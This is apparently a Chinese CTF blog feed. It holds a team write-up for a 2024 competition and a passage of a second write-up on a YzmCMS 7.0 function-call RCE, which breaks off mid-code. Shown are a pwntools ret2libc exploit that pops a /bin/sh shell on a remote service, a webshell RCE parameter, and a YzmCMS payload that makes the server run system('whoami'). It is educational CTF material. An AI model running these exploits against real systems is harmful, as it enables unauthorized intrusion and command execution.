    <content type="html"><![CDATA[<p>前言:大龄选手摸鱼打比赛，因为当天要赶飞机也没好好研究剩下的web题，放上来抄一下冷饭吧，以下是团队wp，排名28</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h1><h2 id="classics"><a class="markdownIt-Anchor" href="#classics"></a> Classics</h2><p>按照给的html进行逆向解码得到flag</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24102142.png" alt="2024-11-24102142"></p><h2 id="easymath"><a class="markdownIt-Anchor" href="#easymath"></a> easymath</h2><p>计算2331位的二进制数中有多少个数字同时满足：是奇数且不包含连续4个0或1的条件，将这个计数值的下一个质数作为RSA的第一个质因子p。通过状态机和动态规划计算满足规则的路径总数，作为密钥 <code>key</code>。7 个状态，分别表示连续 1 和 0 的长度及中性状态,动态规划记录每个位置在不同状态的路径数，最终统计以 <code>1</code> 结尾的路径。然后进行正常的RSA解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br><br>n = <span class="hljs-number">739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059</span><br>c = <span class="hljs-number">229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743</span><br>e = <span class="hljs-number">65537</span><br>l = <span class="hljs-number">2331</span>  <span class="hljs-comment"># DP 序列长度</span><br><br><span class="hljs-comment"># 状态机定义</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_transition</span>():<br>    transition = &#123;s: &#123;&#125; <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)&#125;<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]:<br>            <span class="hljs-keyword">if</span> s <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]:  <span class="hljs-comment"># 连续的 1</span><br>                co = s<br>                transition[s][b] = co + <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> co + <span class="hljs-number">1</span> &lt; <span class="hljs-number">4</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">4</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> s <span class="hljs-keyword">in</span> [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]:  <span class="hljs-comment"># 连续的 0</span><br>                cz = s - <span class="hljs-number">3</span><br>                transition[s][b] = cz + <span class="hljs-number">4</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> cz + <span class="hljs-number">1</span> &lt; <span class="hljs-number">4</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 中性状态</span><br>                transition[s][b] = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> b == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> transition<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compute_key</span>(<span class="hljs-params">l, transition</span>):<br>    DP = [[<span class="hljs-number">0</span>] * <span class="hljs-number">7</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br>    DP[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 初始化为状态 1</span><br><br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, l - <span class="hljs-number">1</span>):<br>        curr, prev = pos % <span class="hljs-number">2</span>, (pos - <span class="hljs-number">1</span>) % <span class="hljs-number">2</span><br>        DP[curr] = [<span class="hljs-number">0</span>] * <span class="hljs-number">7</span><br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>            <span class="hljs-keyword">if</span> DP[prev][s] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]:<br>                next_s = transition[s][b]<br>                <span class="hljs-keyword">if</span> next_s != -<span class="hljs-number">1</span>:<br>                    DP[curr][next_s] += DP[prev][s]<br><br>    <span class="hljs-comment"># 处理最后一位为 1 的情况</span><br>    total = <span class="hljs-number">0</span><br>    curr = (l - <span class="hljs-number">2</span>) % <span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">if</span> DP[curr][s] == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        next_s = transition[s][<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> next_s != -<span class="hljs-number">1</span>:<br>            total += DP[curr][s]<br>    <span class="hljs-keyword">return</span> total<br><br><span class="hljs-comment"># 求解 RSA 因子和解密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rsa</span>(<span class="hljs-params">n, c, e, key</span>):<br>    p = <span class="hljs-built_in">int</span>(next_prime(key))<br>    q = n // p<br>    <span class="hljs-keyword">assert</span> p * q == n, <span class="hljs-string">&quot;分解 n 失败！&quot;</span><br><br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = inverse(e, phi)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    <span class="hljs-keyword">return</span> long_to_bytes(m)<br><br>transition = build_transition()<br>key = compute_key(l, transition)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;计算得到的密钥: <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    flag = decrypt_rsa(n, c, e, key)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密后的 flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密失败: <span class="hljs-subst">&#123;ex&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="aliceaes"><a class="markdownIt-Anchor" href="#aliceaes"></a> AliceAES</h2><p>AES简单了解，使用给定的key iv加密Hello, Bob!，加密结果为hex，提交得到flag</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124142935619.png" alt="image-20241124142935619"></p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124123012.jpg" alt="image-20241124123012"></p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> pwn</h1><h2 id="clock_in"><a class="markdownIt-Anchor" href="#clock_in"></a> clock_in</h2><p>checksec是64位，开NX,FULL RELRO</p><p>ida进行查看</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24213211.png" alt="2024-11-24213211"></p><p>get_info有溢出</p><p>用ROPgadget找到rdi地址，为rdi = 0x4011c5</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24213454.png" alt="2024-11-24213454"></p><p>然后找main函数地址，main = 0x401253</p><p>然后先泄露libc偏移地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">rdi = <span class="hljs-number">0x4011c5</span><br>main = <span class="hljs-number">0x401253</span><br>ret = <span class="hljs-number">0x40101a</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Your info: &quot;</span>)<br>payload = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br></code></pre></td></tr></table></figure><p>然后在计算libc真实地址，并调用system(‘/bin/sh’)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>, <span class="hljs-number">27962</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./clock&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>rdi = <span class="hljs-number">0x4011c5</span><br>main = <span class="hljs-number">0x401253</span><br>ret = <span class="hljs-number">0x40101a</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&quot;Your info: &quot;</span>)<br>payload = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><br>system = libcbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libcbase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>payload2 = <span class="hljs-string">b&quot;\x00&quot;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;a&#x27;</span>) + p64(rdi) + p64(binsh) + p64(rdi+<span class="hljs-number">1</span>) + p64(system)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="ezgetflag"><a class="markdownIt-Anchor" href="#ezgetflag"></a> ezGetFlag</h2><p>bp改为post发包即可</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24100659.png" alt="2024-11-24100659"></p><h2 id="ezfindshell"><a class="markdownIt-Anchor" href="#ezfindshell"></a> ezFindShell</h2><p>下载www.zip,有很多php，d盾扫一下,有一个不一样的</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24214523.png" alt="2024-11-24214523"></p><p>定位，可以直接rce，e=c3lzdGVt(system)</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/2024-11-24112132.png" alt="2024-11-24112132"></p><h1 id="re"><a class="markdownIt-Anchor" href="#re"></a> re</h1><h2 id="entergame"><a class="markdownIt-Anchor" href="#entergame"></a> EnterGame</h2><p>chacha20加密，本质还是异或</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242130621.png" alt="image-20241124213032567"></p><p>直接patch s为s2，即替换输入为密文</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242131868.png" alt="image-20241124213135818"></p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242128319.png" alt="屏幕截图 2024-11-24 113555"></p><p>动调拿到flag</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242128824.png" alt="屏幕截图 2024-11-24 113459"></p><h2 id="flip_over"><a class="markdownIt-Anchor" href="#flip_over"></a> Flip_over</h2><p>jeb反编译，关键都是so动态库调用</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242134532.png" alt="image-20241124213408479"></p><p>逆一下so，找到关键位置</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242136851.png" alt="image-20241124213611788"></p><p>对<code>a4c3f8927d9b8e6d6e483fa2cd0193b0a6e2f19c8b47d5a8f3c7a91e8d4b9f67</code>进行RC4+DES加密，key为<code>flagflag</code>，生成box</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242136132.png" alt="image-20241124213642097"></p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242136419.png" alt="image-20241124213653380"></p><p>再与flag^0x21逐字节异或，与enc比较</p><p>enc：</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242139556.png" alt="image-20241124213934520"></p><p>本质还是异或</p><p>exp</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242142061.png" alt="image-20241124214210995"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4, DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_encrypt</span>(<span class="hljs-params">plaintext, key</span>):<br>    cipher = ARC4.new(key.encode())  <br>    <span class="hljs-keyword">return</span> cipher.encrypt(plaintext.encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_encrypt</span>(<span class="hljs-params">plaintext, key</span>):<br>    des = DES.new(key.encode(), DES.MODE_ECB)  <br>    padded_data = pad(plaintext, DES.block_size)  <br>    <span class="hljs-keyword">return</span> des.encrypt(padded_data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_data</span>(<span class="hljs-params">data1, data2</span>):<br>    length = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(data1), <span class="hljs-built_in">len</span>(data2))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([data1[i] ^ data2[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br>data = <span class="hljs-string">&quot;a4c3f8927d9b8e6d6e483fa2cd0193b0a6e2f19c8b47d5a8f3c7a91e8d4b9f67&quot;</span><br>key = <span class="hljs-string">&quot;flagflag&quot;</span> <br><br>rc4_encrypted = rc4_encrypt(data, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;RC4 Encrypted Data: <span class="hljs-subst">&#123;rc4_encrypted.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br>hex_string = <span class="hljs-string">&quot;3f79a0583bf843d5c2bf868788200059870ce7d2e93e3566b46ed0ea809ff18eb28e12a0718afca8c3af&quot;</span><br>hex_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)<br><br>des_encrypted = des_encrypt(rc4_encrypted, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DES Encrypted Data (EBC): <span class="hljs-subst">&#123;des_encrypted.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br>xor_result = xor_data(des_encrypted, hex_data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;XOR Result: <span class="hljs-subst">&#123;xor_result.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    xor_result_str = xor_result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;XOR Result as String: <span class="hljs-subst">&#123;xor_result_str&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;XOR result contains non-printable characters, cannot convert to a string.&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>跑出来有个不可见字符，十六个字符爆破出flag</p><p><img src="https://n0o0b-blog.oss-cn-nanjing.aliyuncs.com/img/202411242142469.png" alt="image-20241124214253419"></p><p>flag{b92d40df-840a-43a8-bdb4-5de79eca13f4}</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="签到漫画"><a class="markdownIt-Anchor" href="#签到漫画"></a> 签到漫画</h2><p>四个栏目，每个最后一张是二维码碎片，拼起来扫描得到flag</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124135442981.png" alt="image-20241124135442981"></p><h2 id="whitepic"><a class="markdownIt-Anchor" href="#whitepic"></a> whitepic</h2><p>gif帧分离</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124142256302.png" alt="image-20241124142256302"></p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124142318564.png" alt="image-20241124142318564"></p><h2 id="删除后门用户2"><a class="markdownIt-Anchor" href="#删除后门用户2"></a> 删除后门用户2</h2><p>进去ps -ef 看了一下 有一个叫/usr/bin/b的进程</p><p>看了一下是一个后门代码</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133214048.png" alt="image-20241124133214048"></p><p>sudo -l 看了一下有kill权限，直接kill -9 22</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133303982.png" alt="image-20241124133303982"></p><p>然后和队友一起在疯狂删，莫名奇妙就删掉了成功过了</p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133447293.png" alt="image-20241124133447293"></p><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124133502666.png" alt="image-20241124133502666"></p><h2 id="问卷"><a class="markdownIt-Anchor" href="#问卷"></a> 问卷</h2><p><img src="/../../images/%E5%BC%BA%E7%BD%91%E6%9D%AF/2024/image-20241124140747634.png" alt="image-20241124140747634"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战2024复现</title>
    <link href="/2024/11/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/2024/"/>
    <url>/2024/11/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/2024/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="1e824d8ca477b8a8d7f50edbb239108efff9258cdf60e055d050209e19b00766"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 3rd-EZ_CMS</title>
    <link href="/2024/11/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/NSSCTF%203rd-EZ_CMS/"/>
    <url>/2024/11/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/NSSCTF%203rd-EZ_CMS/</url>
    
    <content type="html"><![CDATA[<p>前言:昨天学习了一下CVE-2024-2961,今天趁热打铁写一下gxn师傅之前在暑假出的题。</p><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p><a href="https://www.nssctf.cn/problem/5730">NSSCTF 3rd]EZ_CMS | NSSCTF</a></p><h3 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述</h3><p>听说这个版本的CMS有漏洞，我修了以后总没有了吧！！！</p><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><p>首先看这是<code>yzmcms</code>,搜索一下相关的漏洞</p><p><a href="https://blog.csdn.net/shelter1234567/article/details/138524342">YzmCMS 7.0任意函数调用RCE 漏洞研究分析_yzmcms漏洞-CSDN博客</a></p><p>先按照给的payload打一下看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">out_trade_no[0]=eq&amp;out_trade_no[1]=<span class="hljs-built_in">whoami</span>&amp;out_trade_no[2]=system<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18160507.png" alt="2024-11-18160507"></p><p>发现该漏洞已经被修复了，去下载对应版本看一下源码，原文是</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18163130.png" alt="2024-11-18163130"></p><p>y也就是如果控制<code>$fun</code>和<code>$rule</code>的话可以进行rce，往上分析一下如何传值</p><p>定位到187行和188行，<code>$rule</code>为<code>$vv[1]</code>得到，<code> $fun</code>为<code>$vv[2]</code> 得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rule</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$vv</span>[<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$vv</span>[<span class="hljs-number">1</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$fun</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$vv</span>[<span class="hljs-number">2</span>]) ? <span class="hljs-variable">$vv</span>[<span class="hljs-number">2</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>向上分析<code>$vv</code>（本身数组） 是数组<code>$args</code>中遍历的，经过测试<code> $args</code>其实就是where函数的参数<code>$arr</code>赋予的.</p><p>也就是漏洞是由于where方法引起的，我们需要找找是否存在其他入口点。</p><p>在<code>application/admin/controller/admin_manage.class.php</code>里面找到的</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18165725.png" alt="2024-11-18165725"></p><p>在添加管理员的地方，roleid是直接可控的，先登录后台看看</p><p>用<code>yzmcms::yzmcms</code>来登录</p><p>找到管理员管理，添加抓包，按之前漏洞的形式进行仿照构造payload</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18170522.png" alt="2024-11-18170522"></p><p>测试了一下readfile函数可以正常读取，但是在<code>/proc</code>时发现一样被拦截，并且提示我们看看源码，那么我们读取源码看看是如何过滤的</p><p>定位190和191行过滤的内容</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-11-18172353.png" alt="2024-11-18172353"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span 